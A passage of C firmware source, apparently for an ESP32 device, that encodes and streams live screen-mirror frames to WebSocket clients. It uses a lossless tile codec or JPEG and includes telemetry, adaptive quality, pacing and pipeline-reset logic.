        const uint32_t n = s_mir_win_frames, el_ms = (uint32_t)((now - s_mir_win_t0) / 1000);
        s_mir_st.enc_avg_ms  = s_mir_win_us / n / 1000;
        s_mir_st.enc_avg_us  = s_mir_win_us / n;
        s_mir_st.enc_max_ms  = s_mir_win_max_us / 1000;
        s_mir_st.kb_per_frame = s_mir_win_bytes / n / 1024;
        s_mir_st.bytes_frame = s_mir_win_bytes / n;
        s_mir_st.dirty_pct   = (uint32_t)(((uint64_t)s_mir_win_area / n) * 100ull / (uint64_t)(fw * fh));
        s_mir_st.fps_x10     = el_ms ? (n * 10000u) / el_ms : 0;
        ESP_LOGI(TAG, "mirror: %u frames in %u ms (%u.%u fps) — %s encode avg %u us max %u ms, %u B/frame, %u.%u parts, area %u%%, tap %u us/s, int-dma largest %u B",
                 (unsigned)n, (unsigned)el_ms, (unsigned)(s_mir_st.fps_x10 / 10), (unsigned)(s_mir_st.fps_x10 % 10),
                 s_mir_codec ? "NQ" : "JPEG", (unsigned)s_mir_st.enc_avg_us, (unsigned)s_mir_st.enc_max_ms,
                 (unsigned)s_mir_st.bytes_frame, (unsigned)(s_mir_win_rects / n), (unsigned)((s_mir_win_rects % n) * 10 / n),
                 (unsigned)s_mir_st.dirty_pct, (unsigned)nocsif_ui_mirror_tap_us(),
                 (unsigned)heap_caps_get_largest_free_block(MALLOC_CAP_INTERNAL | MALLOC_CAP_DMA));
        s_mir_win_frames = s_mir_win_us = s_mir_win_max_us = s_mir_win_bytes = s_mir_win_area = s_mir_win_rects = 0;
        s_mir_win_t0 = now;
    }
}

/* Lazily allocate frame buffer bi's PSRAM (kept for the session). */
static bool mir_buf_alloc(mir_buf_t *m)
{
    if (!m->base) {
        m->base = heap_caps_malloc(COMP_JPEG_MAX + 32, MALLOC_CAP_SPIRAM);
        m->data = m->base ? (uint8_t *)(((uintptr_t)m->base + 15) & ~(uintptr_t)15) : NULL;
    }
    return m->data != NULL;
}

/* ---- NQ: lossless RGB565 tile frames (the default codec since 2026-10-12) ------------------------------- *
 * Why: the watch UI is near-black with grey anti-aliased text. Measured on frames recorded from this unit
 * (USB live view, 7 menu screens + 63 Home-ring deltas), a QOI-style lossless coder on the RGB565 pixels is
 * SMALLER than JPEG q85 (whole screens 12-18 KB vs 15-22 KB; Home deltas ~7.5 KB) and pixel-exact, and it
 * costs a compare and a few shifts per pixel instead of a DCT — the JPEG encoder ran at ~2.4 µs/px in situ
 * (6x its datasheet speed: PSRAM + a cache shared with the LVGL render), ~190 ms per Home frame.
 *
 * Message: 'N','Q', ver 1, flags (bit0 keyframe), W u16, H u16, tile w u8, tile h u8, cols u8, rows u8,
 * stream length u32, row mask u64 (bit ty = tile row present), a u32 column mask per present row (ascending
 * ty), then the op stream (all little-endian). Pixels are visited tile row by tile row; each maximal run of
 * set columns in a row is a rectangle (clipped to W × H) scanned row-major. The coder state (previous pixel,
 * 64-entry index) runs across the whole stream from prev = 0 and an all-zero index. Ops:
 *   00iiiiii           INDEX  index[i]
 *   01rrggbb           DIFF   dr, dg, db in [-2, 1]                       (565 units, wrapping)
 *   10gggggg rrrrbbbb  LUMA   dg in [-32, 31]; dr - (dg >> 1), db - (dg >> 1) in [-8, 7]
 *   11nnnnnn (< 0xFD)  RUN    n + 1 copies of the previous pixel (1..61)
 *   0xFD k             RUN    62 + k copies (62..317)
 *   0xFE lo hi         RAW    the pixel, RGB565 LE
 * index[(r * 3 + g * 5 + b * 7) & 63] = pixel after every non-run op. Reference coder + test vectors:
 * tools/nocsif_bridge/nq_codec.py; the page's decoder is in COMP_PAGE_HTML. */
#define NQ_HDR_FIXED  24
#define NQ_HDR_MAX    (NQ_HDR_FIXED + 4 * NOCSIF_MIR_TROWS)

typedef struct { uint16_t idx[64]; uint32_t prev, run; } nq_enc_t;

static inline uint32_t nq_hash(uint32_t px) { return ((px >> 11) * 3u + ((px >> 5) & 63u) * 5u + (px & 31u) * 7u) & 63u; }

static inline uint8_t *nq_put_run(uint8_t *o, uint32_t run)
{
    while (run >= 62) {
        const uint32_t n = run > 317 ? 317 : run;
        *o++ = 0xFD; *o++ = (uint8_t)(n - 62);
        run -= n;
    }
    if (run) *o++ = (uint8_t)(0xC0 + run - 1);
    return o;
}

/* Encode n pixels; at most 3 bytes per pixel are written. */
static uint8_t *nq_row(nq_enc_t *st, const uint16_t *src, int n, uint8_t *o)
{
    uint32_t prev = st->prev, run = st->run;
    for (int x = 0; x < n; x++) {
        const uint32_t px = src[x];
        if (px == prev) { run++; continue; }
        if (run) { o = nq_put_run(o, run); run = 0; }
        const uint32_t h = nq_hash(px);
        if (st->idx[h] == px) { *o++ = (uint8_t)h; prev = px; continue; }
        st->idx[h] = (uint16_t)px;
        const int dr = (((int)(px >> 11) - (int)(prev >> 11) + 16) & 31) - 16;
        const int dg = (((int)((px >> 5) & 63) - (int)((prev >> 5) & 63) + 32) & 63) - 32;
        const int db = (((int)(px & 31) - (int)(prev & 31) + 16) & 31) - 16;
        if ((unsigned)(dr + 2) < 4u && (unsigned)(dg + 2) < 4u && (unsigned)(db + 2) < 4u) {
            *o++ = (uint8_t)(0x40 | ((dr + 2) << 4) | ((dg + 2) << 2) | (db + 2));
        } else {
            const int hg = dg >> 1;                               /* arithmetic: floor, as the decoders */
            const int rr = (((dr - hg) + 16) & 31) - 16, bb = (((db - hg) + 16) & 31) - 16;
            if ((unsigned)(rr + 8) < 16u && (unsigned)(bb + 8) < 16u) {
                *o++ = (uint8_t)(0x80 | (dg + 32));
                *o++ = (uint8_t)(((rr + 8) << 4) | (bb + 8));
            } else {
                *o++ = 0xFE; *o++ = (uint8_t)px; *o++ = (uint8_t)(px >> 8);
            }
        }
        prev = px;
    }
    st->prev = prev; st->run = run;
    return o;
}

/* NQ-encode the given tiles of the live mirror buffer into frame buffer bi, covering (from, seq]. Mirror task
 * only. Tiles that do not fit the buffer (only a noise-like whole screen can exceed it: 3 B/px worst case)
 * go to s_mir_carry and ride in the next frame — every frame is still a set of whole-pixel tiles, so a
 * partial one is valid to apply. On failure the buffer is left EMPTY and the caller forces a keyframe. */
static bool mir_encode_nq(int bi, const uint8_t *fb, int fw, int fh, const uint32_t *tiles, bool key, uint32_t seq, uint32_t from)
{
    mir_buf_t *m = &s_mb[bi];
    taskENTER_CRITICAL(&s_ws_mux);
    m->len = 0; m->seq = 0; m->from = 0;                  /* nobody starts sending it while we write */
    taskEXIT_CRITICAL(&s_ws_mux);
    if (!fb || fw <= 0 || fh <= 0) return false;
    if (!mir_buf_alloc(m)) { s_mir_st.enc_fail++; return false; }

    const int64_t t0 = esp_timer_get_time();
    const int TW = NOCSIF_MIR_TILE_W, TH = NOCSIF_MIR_TILE_H;
    uint8_t *const s0  = m->data + NQ_HDR_MAX;            /* stream; the header is written in front of it after */
    uint8_t *const lim = m->data + COMP_JPEG_MAX - 2048;   /* margin: a pending run is written after the last room check (~650 B max) */
    uint8_t *o = s0;
    nq_enc_t st;
    memset(&st, 0, sizeof st);
    uint32_t enc[NOCSIF_MIR_TROWS];
    memset(enc, 0, sizeof enc);
    uint64_t rowmask = 0;
    int nrows = 0, parts = 0;
    uint32_t area = 0;
    bool spill = false;
    const uint16_t *fb16 = (const uint16_t *)fb;
    for (int ty = 0; ty < NOCSIF_MIR_TROWS; ty++) {
        const uint32_t cm = tiles[ty];
        if (!cm) continue;
        if (spill) { s_mir_carry[ty] |= cm; continue; }
        const int y0 = ty * TH, y1 = (y0 + TH < fh) ? y0 + TH : fh;
        int tx = 0;
        while (tx < NOCSIF_MIR_TCOLS) {
            if (!((cm >> tx) & 1u)) { tx++; continue; }
            const int c0 = tx;
            while (tx < NOCSIF_MIR_TCOLS && ((cm >> tx) & 1u)) tx++;
            const int x0 = c0 * TW, x1 = (tx * TW < fw) ? tx * TW : fw;
            const int npx = (x1 - x0) * (y1 - y0);
            if (npx <= 0) continue;
            if (o + (size_t)npx * 3 + 8 > lim) {          /* out of room: this run and everything after → next frame */
                spill = true;
                s_mir_carry[ty] |= cm & ~((1u << c0) - 1u);
                break;
            }
            for (int y = y0; y < y1; y++) o = nq_row(&st, fb16 + (size_t)y * fw + x0, x1 - x0, o);
            enc[ty] |= ((1u << tx) - 1u) & ~((1u << c0) - 1u);
            area += (uint32_t)npx;
            parts++;
        }
        if (enc[ty]) { rowmask |= 1ull << ty; nrows++; }
    }
    if (st.run) o = nq_put_run(o, st.run);
    if (nrows == 0) return false;

    const uint32_t slen = (uint32_t)(o - s0);
    const int hsz = NQ_HDR_FIXED + 4 * nrows;
    uint8_t *h = s0 - hsz;
    h[0] = 'N'; h[1] = 'Q'; h[2] = 1; h[3] = key ? 1 : 0;
    h[4] = (uint8_t)fw; h[5] = (uint8_t)(fw >> 8); h[6] = (uint8_t)fh; h[7] = (uint8_t)(fh >> 8);
    h[8] = (uint8_t)TW; h[9] = (uint8_t)TH; h[10] = NOCSIF_MIR_TCOLS; h[11] = NOCSIF_MIR_TROWS;
    for (int i = 0; i < 4; i++) h[12 + i] = (uint8_t)(slen >> (8 * i));
    for (int i = 0; i < 8; i++) h[16 + i] = (uint8_t)(rowmask >> (8 * i));
    uint8_t *q = h + NQ_HDR_FIXED;
    for (int ty = 0; ty < NOCSIF_MIR_TROWS; ty++) {
        if (!enc[ty]) continue;
        for (int i = 0; i < 4; i++) *q++ = (uint8_t)(enc[ty] >> (8 * i));
    }
    mir_telemetry(t0, (uint32_t)hsz + slen, area, parts, from, fw, fh);
    taskENTER_CRITICAL(&s_ws_mux);
    m->off = (int)(h - m->data); m->len = hsz + (int)slen; m->seq = seq; m->from = from;
    memcpy(m->tiles, enc, sizeof enc);
    taskEXIT_CRITICAL(&s_ws_mux);
    s_mir_progress_us = esp_timer_get_time();
    return true;
}

/* JPEG-encode the changed tiles (unioned into <= 4 rectangles) of the live mirror buffer into frame buffer
 * `bi` as one 'NP' chunk message covering (from, seq]. The A/B path (`gw mirror codec=0`); mirror task only.
 * On any failure the buffer is left EMPTY and the caller forces a keyframe. The snapshot is a plain row copy
 * from the live buffer — a rare tear from an overlapping capture re-marks its tiles anyway. */
/* Copy rows [r0, r0 + n) of the padded rect (x0, y0, w x h, padded width wp) from the live frame into dst
 * (row-major, wp pixels a row), replicating the last row / column into the MCU padding. */
static void mir_fill_rows(uint8_t *dst, const uint8_t *fb, int fw, int x0, int w, int wp, int y0, int h, int r0, int n)
{
    for (int r = 0; r < n; r++) {
        const int y  = r0 + r;
        const int sy = y0 + (y < h ? y : h - 1);
        const uint8_t *src = fb + ((size_t)sy * fw + x0) * 2;
        uint8_t *d = dst + (size_t)r * wp * 2;
        memcpy(d, src, (size_t)w * 2);
        if (wp > w) {
            const uint16_t last = ((const uint16_t *)src)[w - 1];
            uint16_t *d16 = (uint16_t *)d;
            for (int x = w; x < wp; x++) d16[x] = last;
        }
    }
}

static int mir_rect_union(int rects[][4], int n, const int r[4]);   /* fwd */
static bool mir_encode_jpeg(int bi, const uint8_t *fb, int fw, int fh, const uint32_t *tiles, uint32_t seq, uint32_t from)
{
    mir_buf_t *m = &s_mb[bi];
    taskENTER_CRITICAL(&s_ws_mux);
    m->len = 0; m->seq = 0; m->from = 0;                  /* nobody starts sending it while we write */
    taskEXIT_CRITICAL(&s_ws_mux);
    /* The changed tiles, unioned into at most MIR_RECTS rectangles (inclusive px) — one per run of tiles. */
    int rects[MIR_RECTS][4], nr = 0;
    for (int ty = 0; ty < NOCSIF_MIR_TROWS; ty++) {
        const uint32_t cm = tiles[ty];
        for (int tx = 0; tx < NOCSIF_MIR_TCOLS; ) {
            if (!((cm >> tx) & 1u)) { tx++; continue; }
            const int c0 = tx;
            while (tx < NOCSIF_MIR_TCOLS && ((cm >> tx) & 1u)) tx++;
            const int r[4] = { c0 * NOCSIF_MIR_TILE_W, ty * NOCSIF_MIR_TILE_H,
                               tx * NOCSIF_MIR_TILE_W - 1, ty * NOCSIF_MIR_TILE_H + NOCSIF_MIR_TILE_H - 1 };
            nr = mir_rect_union(rects, nr, r);
        }
    }
    if (!fb || fw <= 0 || fh <= 0 || nr <= 0) return false;

    /* Buffers: the snapshot holds one rect padded to the MCU grid (up to a padded full frame); the output
     * holds the whole message (every chunk). Both PSRAM, 16-aligned (the encoder's requirement). */
    const size_t snap_cap = (size_t)((fw + 15) & ~15) * (size_t)((fh + 15) & ~15) * 2;   /* 16-row MCUs (4:2:0) fit too */
    if (!s_jraw || s_jraw_cap < (int)snap_cap) {
        if (s_jraw_base) heap_caps_free(s_jraw_base);
        s_jraw_base = heap_caps_malloc(snap_cap + 16, MALLOC_CAP_SPIRAM);
        s_jraw = s_jraw_base ? (uint8_t *)(((uintptr_t)s_jraw_base + 15) & ~(uintptr_t)15) : NULL;
        s_jraw_cap = s_jraw ? (int)snap_cap : 0;
    }
    if (!s_jraw || !mir_buf_alloc(m)) { s_mir_st.enc_fail++; return false; }

    const int64_t t0 = esp_timer_get_time();
    size_t off = 0;                                   /* message write cursor (always 16-aligned) */
    uint32_t bytes = 0, area = 0;
    int painted = 0;
    const int sub = s_mir_sub, blk = s_mir_blk;
    const int mh  = (sub == JPEG_SUBSAMPLE_420) ? 16 : 8;     /* MCU height: 16x16 for 4:2:0, 16x8 for 4:2:2 */
    for (int i = 0; i < nr; i++) {
        /* Snap the rect outward to the JPEG MCU grid, clamp to the frame, then PAD the input back out to whole
         * MCUs by replicating the last row / column: the encoder always sees full blocks, and the page clips the
         * few extra pixels at the canvas edge (padding only ever falls past the frame's right / bottom edge). */
        int x0 = rects[i][0] & ~15, y0 = rects[i][1] / mh * mh;
        int x1 = rects[i][2] | 15,  y1 = rects[i][3] / mh * mh + mh - 1;
        if (x0 < 0) x0 = 0;
        if (y0 < 0) y0 = 0;
        if (x1 >= fw) x1 = fw - 1;
        if (y1 >= fh) y1 = fh - 1;
        const int w = x1 - x0 + 1, h = y1 - y0 + 1;
        if (w <= 0 || h <= 0) continue;
        const int wp = (w + 15) & ~15, hp = (h + mh - 1) / mh * mh;
        if (!s_enc || s_enc_w != wp || s_enc_h != hp || s_enc_q != s_mir_q || s_enc_sub != sub) {   /* (re)open */
            if (s_enc) { jpeg_enc_close(s_enc); s_enc = NULL; }
            jpeg_enc_config_t cfg = DEFAULT_JPEG_ENC_CONFIG();
            cfg.width       = wp;
            cfg.height      = hp;
            cfg.src_type    = JPEG_PIXEL_FORMAT_RGB565_LE;
            cfg.subsampling = (jpeg_subsampling_t)sub;
            cfg.quality     = s_mir_q;
            if (jpeg_enc_open(&cfg, &s_enc) != JPEG_ERR_OK || !s_enc) {
                s_enc = NULL; s_mir_st.enc_fail++;
                ESP_LOGW(TAG, "mirror: jpeg encoder open %dx%d q%d failed (int-dma largest %u)", wp, hp, s_mir_q,
                         (unsigned)heap_caps_get_largest_free_block(MALLOC_CAP_INTERNAL | MALLOC_CAP_DMA));
                return false;
            }
            s_enc_w = wp; s_enc_h = hp; s_enc_q = s_mir_q; s_enc_sub = sub;
        }
        if (off + COMP_FRAME_HDR + 4096 > COMP_JPEG_MAX) break;   /* out of room: what fits goes out; a keyframe follows */
        if (i > 0) vTaskDelay(pdMS_TO_TICKS(MIR_ROUND_SLEEP_MS));  /* between rects: let idle (task-wdt) and the other workers run */
        uint8_t *hdr = m->data + off;
        uint8_t *jpg = hdr + COMP_FRAME_HDR;
        const int jcap = (int)(COMP_JPEG_MAX - off - COMP_FRAME_HDR);
        int out = 0;
        bool ok = false;
        const int bs = blk ? jpeg_enc_get_block_size(s_enc) : 0;
        if (blk && bs == wp * mh * 2) {
            /* Stripe mode: one MCU row at a time from a small (cache-resident) stripe. */
            if (!s_jblk || s_jblk_cap < bs) {
                if (s_jblk_base) heap_caps_free(s_jblk_base);
                s_jblk_base = heap_caps_malloc((size_t)bs + 16, MALLOC_CAP_SPIRAM);
                s_jblk = s_jblk_base ? (uint8_t *)(((uintptr_t)s_jblk_base + 15) & ~(uintptr_t)15) : NULL;
                s_jblk_cap = s_jblk ? bs : 0;
            }
            if (s_jblk) {
                int ret = JPEG_ERR_FAIL;
                for (int by = 0; by < hp; by += mh) {
                    mir_fill_rows(s_jblk, fb, fw, x0, w, wp, y0, h, by, mh);
                    ret = jpeg_enc_process_with_block(s_enc, s_jblk, bs, jpg, jcap, &out);
                    if (ret < JPEG_ERR_OK) break;
                }
                ok = (ret == JPEG_ERR_OK && out > 0);
            }
        } else {
            mir_fill_rows(s_jraw, fb, fw, x0, w, wp, y0, h, 0, hp);   /* whole-rect snapshot */
            ok = jpeg_enc_process(s_enc, s_jraw, wp * hp * 2, jpg, jcap, &out) == JPEG_ERR_OK && out > 0;
        }
        if (!ok) {
            s_mir_st.enc_fail++;
            ESP_LOGW(TAG, "mirror: jpeg encode failed (%dx%d, %s, block %d, out=%d)", wp, hp, blk ? "stripes" : "whole",
                     bs, out);
            jpeg_enc_close(s_enc); s_enc = NULL;      /* reopen fresh next time */
            return false;
        }
        /* chunk header: 'N','P', ver 2, 0, x0 u16, y0 u16, jpeg length u32, pad — the page paints the JPEG
         * at (x0,y0) and steps to the next 16-aligned chunk */
        memset(hdr, 0, COMP_FRAME_HDR);
        hdr[0] = 'N'; hdr[1] = 'P'; hdr[2] = 2;
        hdr[4] = (uint8_t)x0; hdr[5] = (uint8_t)(x0 >> 8); hdr[6] = (uint8_t)y0; hdr[7] = (uint8_t)(y0 >> 8);
        hdr[8] = (uint8_t)out; hdr[9] = (uint8_t)(out >> 8); hdr[10] = (uint8_t)(out >> 16); hdr[11] = (uint8_t)(out >> 24);
        off = (off + COMP_FRAME_HDR + (size_t)out + 15) & ~(size_t)15;
        bytes += (uint32_t)out; area += (uint32_t)(w * h);
        painted++;
    }
    if (off == 0 || painted == 0) return false;
    mir_telemetry(t0, bytes, area, painted, from, fw, fh);

    taskENTER_CRITICAL(&s_ws_mux);
    m->off = 0; m->len = (int)off; m->seq = seq; m->from = from;
    memcpy(m->tiles, tiles, sizeof m->tiles);
    taskEXIT_CRITICAL(&s_ws_mux);
    if (painted < nr) s_mir_force_full = true;        /* a rect was dropped for room: next frame a keyframe */
    s_mir_progress_us = esp_timer_get_time();
    return true;
}

/* Reset the whole pipeline in place (no reboot, no surface drop): every cursor idle + marked for a
 * keyframe, both frame buffers empty, the encoder reopened, a keyframe forced. Counted. */
static void mir_reset(const char *why)
{
    s_mir_st.resets++;
    ESP_LOGW(TAG, "mirror: pipeline reset (%s) — resets=%u stalls=%u enc_fail=%u", why,
             (unsigned)s_mir_st.resets, (unsigned)s_mir_st.stalls, (unsigned)s_mir_st.enc_fail);
    taskENTER_CRITICAL(&s_ws_mux);
    for (int i = 0; s_ws_tx && i < COMP_WS_MAX; i++) {
        ws_tx_t *t = &s_ws_tx[i];
        t->total = 0; t->off = 0; t->buf = -1; t->payload = NULL; t->need_full = true;
    }
    for (int b = 0; b < MIR_BUFS; b++) { s_mb[b].len = 0; s_mb[b].seq = 0; s_mb[b].from = 0; }
    memset(s_mir_carry, 0, NOCSIF_MIR_TROWS * sizeof *s_mir_carry);   /* a keyframe follows: nothing is owed */
    taskEXIT_CRITICAL(&s_ws_mux);
    if (s_enc) { jpeg_enc_close(s_enc); s_enc = NULL; }
    s_mir_force_full = true;
    s_mir_progress_us = esp_timer_get_time();
}

/* Diagnostic snapshot of the pipeline (rate-limited by the caller): frame buffers + every client cursor. */
static void mir_dump(const char *why)
{
    struct { uint32_t seq, from; int len; } mb[MIR_BUFS];
    struct { int fd, buf; uint32_t last, bseq; size_t off, total; bool full; } cl[COMP_WS_MAX];
    taskENTER_CRITICAL(&s_ws_mux);
    for (int b = 0; b < MIR_BUFS; b++) { mb[b].seq = s_mb[b].seq; mb[b].from = s_mb[b].from; mb[b].len = s_mb[b].len; }
    for (int i = 0; i < COMP_WS_MAX; i++) {
        const ws_tx_t *t = s_ws_tx ? &s_ws_tx[i] : NULL;
        cl[i].fd = s_ws_fds[i];
        if (t) { cl[i].buf = t->buf; cl[i].last = t->last_seq; cl[i].bseq = t->buf_seq; cl[i].off = t->off; cl[i].total = t->total; cl[i].full = t->need_full; }
        else   { cl[i].buf = -1; cl[i].last = 0; cl[i].bseq = 0; cl[i].off = cl[i].total = 0; cl[i].full = false; }
    }
    taskEXIT_CRITICAL(&s_ws_mux);
    char line[224]; int o = 0;
    for (int b = 0; b < MIR_BUFS && o < (int)sizeof line; b++)
        o += snprintf(line + o, sizeof line - (size_t)o, " B%d{seq %u from %u len %d}", b, (unsigned)mb[b].seq, (unsigned)mb[b].from, mb[b].len);
    for (int i = 0; i < COMP_WS_MAX && o < (int)sizeof line; i++)
        if (cl[i].fd) o += snprintf(line + o, sizeof line - (size_t)o, " C%d{fd %d last %u buf %d/%u off %u/%u full %d}", i, cl[i].fd,
                                    (unsigned)cl[i].last, cl[i].buf, (unsigned)cl[i].bseq, (unsigned)cl[i].off, (unsigned)cl[i].total, (int)cl[i].full);
    ESP_LOGW(TAG, "mirror: %s — seq %u force_full %d backoff %d%s", why, (unsigned)s_mir_seq, (int)s_mir_force_full,
             (int)(esp_timer_get_time() < s_mir_backoff_until_us), line);
}

/* Adaptive quality (once a second): step DOWN when the slowest active client's send rate is low or the
 * encode is slow; step back UP slowly when both are comfortable. */
static void mir_adapt(int64_t now)
{
    if (now - s_mir_adapt_us < 1000000) return;
    s_mir_adapt_us = now;
    uint32_t min_kbps = 0; int clients = 0;
    taskENTER_CRITICAL(&s_ws_mux);
    for (int i = 0; s_ws_tx && i < COMP_WS_MAX; i++) {
        if (s_ws_fds[i] == 0) continue;
        clients++;
        const uint32_t k = s_ws_tx[i].kbps;
        if (k && (min_kbps == 0 || k < min_kbps)) min_kbps = k;
    }
    taskEXIT_CRITICAL(&s_ws_mux);
    s_mir_st.send_kbps = min_kbps;
    s_mir_st.clients   = (uint32_t)clients;
    s_mir_st.quality   = (uint32_t)s_mir_q;
    if (!clients) return;
    /* Quality follows the LINK only. Quality barely moves the encode time (that is set by the dirty area
     * and whatever else core 0 is doing) and the encoder's buffers are PSRAM, so neither a slow encode nor
     * internal-DMA pressure is a quality input — measured on device, those rules just pinned the picture
     * at the floor for nothing. A slow client link is the one thing fewer bytes per frame cure. */
    const bool slow_link = (min_kbps && min_kbps < 120);
    const bool fast_link = (min_kbps > 350);
    int q = s_mir_q;
    if (s_mir_q_fixed) q = s_mir_q_fixed;
    else if (slow_link && q > MIR_Q_MIN && now - s_mir_q_changed_us > 2000000) q -= MIR_Q_STEP;
    else if (fast_link && q < MIR_Q_MAX && now - s_mir_q_changed_us > 6000000) q += MIR_Q_STEP;
    if (q != s_mir_q) {
        ESP_LOGI(TAG, "mirror: quality %d -> %d (slowest client %u KB/s, encode avg %u ms)",
                 s_mir_q, q, (unsigned)min_kbps, (unsigned)s_mir_st.enc_avg_ms);
        s_mir_q = q; s_mir_q_changed_us = now;
    }
}

/* Pacing (once a second): the spacing between encodes follows the LVGL lag gauge unless a bridge cap pins it. */
static void mir_pace(int64_t now)
{
    if (now - s_mir_pace_us < 1000000) return;
    s_mir_pace_us = now;
    /* Forwarded packets in the last second (both directions; the gateway is the only forwarder). While the
     * hotspot carries real traffic the encoder — core 0, PSRAM-heavy, the same core and bus the Wi-Fi driver
     * and lwIP forward on — is held to at least s_mir_fwd_floor_ms between frames (knob `gw mirror fwd=MS`). */
    static uint16_t s_fw_last;
    const uint16_t fw_now = (uint16_t)lwip_stats.ip.fw;
    const uint32_t fwd_pps = (uint16_t)(fw_now - s_fw_last);
    s_fw_last = fw_now;
    s_mir_fwd_pps = fwd_pps;
    if (s_mir_fps_cap > 0) { s_mir_interval_us = 1000000 / s_mir_fps_cap; return; }
    uint32_t avg_x10 = 0, lag = 0;
    nocsif_ui_lvgl_tick_stats(&avg_x10, &lag);
    const uint32_t avg_ms = avg_x10 / 10;
    int64_t iv = s_mir_interval_us;
    if (avg_ms > (uint32_t)s_mir_lag_hi)      iv = iv * 3 / 2;
    else if (avg_ms < (uint32_t)s_mir_lag_lo) iv = iv * 4 / 5;
    if (s_mir_fwd_floor_ms > 0 && fwd_pps >= MIR_FWD_BUSY_PPS && iv < (int64_t)s_mir_fwd_floor_ms * 1000)
        iv = (int64_t)s_mir_fwd_floor_ms * 1000;
    if (iv < MIR_INTERVAL_MIN_US) iv = MIR_INTERVAL_MIN_US;
    if (iv > MIR_INTERVAL_MAX_US) iv = MIR_INTERVAL_MAX_US;
    if (iv != s_mir_interval_us) {
        ESP_LOGI(TAG, "mirror: pacing %d -> %d ms (LVGL timer avg %u.%u ms, max %u ms)", (int)(s_mir_interval_us / 1000),
                 (int)(iv / 1000), (unsigned)(avg_x10 / 10), (unsigned)(avg_x10 % 10), (unsigned)lag);
        s_mir_interval_us = iv;
    }
}

/* Live-state JSON (~2 Hz per client) on an idle cursor; built outside the lock, handed over under it. */
static void mir_state_frames(int64_t now)
{
    if (!s_comp_state_fn || !s_ws_tx) return;
    for (int i = 0; i < COMP_WS_MAX; i++) {
        ws_tx_t *t = &s_ws_tx[i];
        if (s_ws_fds[i] == 0 || t->total != 0 || now - t->t_state < MIR_STATE_US) continue;
        char js[sizeof t->txt];
        js[0] = '\0';
        s_comp_state_fn(js, sizeof js);
        const size_t len = strlen(js);
        if (!len) continue;
        taskENTER_CRITICAL(&s_ws_mux);
        if (s_ws_fds[i] != 0 && t->total == 0) {
            memcpy(t->txt, js, len + 1);
            t->hdr_len = ws_hdr(t->hdr, 0x81, len);
            t->payload = t->txt; t->off = 0; t->total = t->hdr_len + len;
            t->buf = -1; t->t_start = t->t_progress = now; t->t_state = now;
        }
        taskEXIT_CRITICAL(&s_ws_mux);
    }
}

/* One round of the pipeline (mirror task, under s_mir_lock): pump → start idle clients → encode the next
 * frame if a buffer is free and something changed (or a keyframe is owed) → pump again → state frames. */
static void mir_round(void)
{
    if (!s_mb || !s_mir_carry) return;                     /* mir_start allocates them before enabling */
    int64_t now = esp_timer_get_time();
    for (int i = 0; i < COMP_WS_MAX; i++) s_txb_left[i] = s_mir_txb;   /* this round's write budget per client */
    mir_pump_all();
    if (nocsif_wifi_companion_ws_clients() == 0) {            /* nobody watching: idle (frames kept; a joiner gets a keyframe) */
        s_mir_pending = false;
        s_mir_progress_us = now;
        return;
    }
    if (s_mir_pending && now - s_mir_progress_us > MIR_RESET_US) mir_reset("no progress");
    mir_start_idle();
    mir_pump_all();

    bool need_union = false;
    /* The pacer spaces CAPTURE requests (each costs the LVGL task a flush-tap pass + the re-render of what went
     * stale); what a capture brings is encoded at once — ~10 ms on core 0 — so a frame costs max(interval,
     * capture), not interval + capture. */
    const bool arm_ok = (now - s_mir_last_arm_us >= mir_eff_interval_us(now));
    /* Every client frozen mid-frame (no byte moved for 1 s): nothing can be sent, so do not keep encoding ever
     * wider unions of the same screen for them — that burnt ~45 ms of core 0 per frame at 9 fps for no reader
     * (2026-10-13 phone report) and kept the tap and LVGL re-rendering. The stall ladder / drop takes it from here. */
    const bool all_stuck = s_mir_pending && s_mir_sending && now - s_mir_progress_us > 1000000;
    int bi = (!s_mir_paused && !all_stuck && now >= s_mir_backoff_until_us) ? mir_pick_buf(&need_union) : -1;
    /* Pull capture (ui.c): the flush tap copies pixels only during the refresh the mirror asks for. Nothing
     * to encode yet → LVGL kicks this task when the capture lands. */
    if (bi >= 0) {
        bool armed = false;
        if (!nocsif_ui_mirror_fresh(arm_ok, &armed)) bi = -1;
        if (armed) s_mir_last_arm_us = now;
    }
    if (bi >= 0) {
        uint32_t tiles[NOCSIF_MIR_TROWS];
        int fw = 0, fh = 0;
        const uint8_t *fb = NULL;
        bool need_full = s_mir_force_full;
        taskENTER_CRITICAL(&s_ws_mux);
        for (int i = 0; i < COMP_WS_MAX; i++) if (s_ws_fds[i] && s_ws_tx[i].need_full) need_full = true;
        taskEXIT_CRITICAL(&s_ws_mux);
        bool took = nocsif_ui_mirror_take(&fb, &fw, &fh, tiles);
        if (took) nocsif_ui_rlat_mark(NOCSIF_RL_TAKE);     /* tap-to-picture probe (ui.h) */
        for (int ty = 0; ty < NOCSIF_MIR_TROWS; ty++) {      /* tiles the previous frame had no room for */
            if (s_mir_carry[ty]) { tiles[ty] |= s_mir_carry[ty]; s_mir_carry[ty] = 0; took = true; }
        }
        if ((took || need_full) && fb && fw > 0 && fh > 0) {
            uint32_t from = s_mir_seq;                     /* this frame carries exactly the takes since the last encode */
            bool full = need_full;
            if (!full && need_union) {
                /* the overwritten buffer (and whatever else is ready) still owes tiles to a client: carry them
                 * along and extend the coverage back to the oldest such frame */
                taskENTER_CRITICAL(&s_ws_mux);
                for (int b = 0; b < MIR_BUFS; b++) {
                    const mir_buf_t *m = &s_mb[b];
                    if (m->len <= 0) continue;
                    if (m->from == 0) { full = true; break; }   /* an undelivered keyframe → this one is a keyframe too */
                    if (m->from < from) from = m->from;
                    for (int ty = 0; ty < NOCSIF_MIR_TROWS; ty++) tiles[ty] |= m->tiles[ty];
                }
                taskEXIT_CRITICAL(&s_ws_mux);
            }
            if (full) {
                for (int ty = 0; ty < NOCSIF_MIR_TROWS; ty++) tiles[ty] = (1u << NOCSIF_MIR_TCOLS) - 1u;
                from = 0;
            }
            const uint32_t seq = s_mir_seq + 1;
            s_mir_last_enc_us = esp_timer_get_time();
            const bool ok = s_mir_codec ? mir_encode_nq(bi, fb, fw, fh, tiles, full, seq, from)
                                        : mir_encode_jpeg(bi, fb, fw, fh, tiles, seq, from);
            if (ok) {
                s_mir_seq = seq;
                nocsif_ui_rlat_mark(NOCSIF_RL_ENC);
                if (full) s_mir_force_full = false;
                s_mir_backoff_until_us = 0;
            } else {
                s_mir_force_full = true;                   /* the taken tiles are gone: the next frame is a keyframe */
                s_mir_backoff_until_us = esp_timer_get_time() + (s_mir_st.enc_fail > 5 ? 1000000 : 250000);
            }
            mir_start_idle();
            mir_pump_all();
        }
    }
    now = esp_timer_get_time();
